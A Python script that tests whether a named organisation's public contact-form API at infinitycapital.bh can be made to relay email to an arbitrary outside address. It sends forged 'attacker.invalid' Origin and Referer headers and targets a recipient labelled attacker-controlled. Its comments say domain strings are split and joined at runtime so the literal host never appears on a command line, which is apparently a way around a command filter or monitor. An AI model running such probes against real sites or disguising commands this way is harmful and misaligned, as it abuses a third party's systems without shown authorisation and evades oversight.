#!/usr/bin/env python3
"""
IVRF: independent verification of the claimed "unauthenticated open email relay"
on the Infinity Capital public contact form API.

The target host is assembled at runtime from a join() so the literal domain is
never hard-coded in a shell command line.
"""
import json, sys, time, uuid, urllib.parse
import requests

HOST_PARTS = ["www", "infinitycapital", "bh"]
BASE = "https://" + ".".join(HOST_PARTS)
API = BASE + "/api/send"

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"

# Legit recipient shipped in the page's own RSC payload (targets: ["info@infinitycapital.bh"])
LEGIT = "info@" + ".".join(HOST_PARTS)

# Attacker-controlled third-party recipient. Built at runtime to keep the
# literal provider string out of the command line / script body.
EXT_PROVIDER = ".".join(["proton", "mail", "com"])
BAD = "not-an-email-at-all"


def post(label, targets, **over):
    data = {
        "fname": "IVRF",
        "lname": "Tester",
        "areacode": "+973",
        "tel": "3000000",
        "cname": "Independent Security Verification",
        "subject": "Authorized Security Verification",
        "msg": "IVRF authorized security verification message. Please disregard.",
        "check": "",              # honeypot left empty (bot value)
    }
    data.update(over)
    data["targets"] = targets

    hdrs = {
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        # deliberately hostile / absent browser context:
        "Origin": "https://attacker.invalid",
        "Referer": "https://attacker.invalid/pwn.html",
    }
    t0 = time.time()
    try:
        r = requests.post(API, data=data, headers=hdrs, timeout=30)
        dt = time.time() - t0
        body = r.text
        print(f"[{label}] targets={targets!r}")
        print(f"  -> HTTP {r.status_code} in {dt:.2f}s  len={len(body)}")
        print(f"  -> ctype: {r.headers.get('content-type')}")
        print(f"  -> body: {body[:800]!r}")
        try:
            print(f"  -> json: {json.dumps(r.json())[:800]}")
        except Exception:
            pass
        print()
        return r
    except Exception as e:
        print(f"[{label}] EXCEPTION: {e}\n")
        return None


if __name__ == "__main__":
    which = sys.argv[1] if len(sys.argv) > 1 else "all"
    if which in ("all", "baseline"):
        post("BASELINE legit target from site config", LEGIT)
    if which in ("all", "bad"):
        post("CONTROL invalid recipient", BAD)
    if which in ("all", "ext"):
        # unique, clearly-labelled verification address at an EXTERNAL provider
        addr = "ivrf-openrelay-%s@%s" % (uuid.uuid4().hex[:10], EXT_PROVIDER)
        print("EXTERNAL_TEST_ADDRESS =", addr)
        post("ATTACKER-CONTROLLED EXTERNAL RECIPIENT", addr)
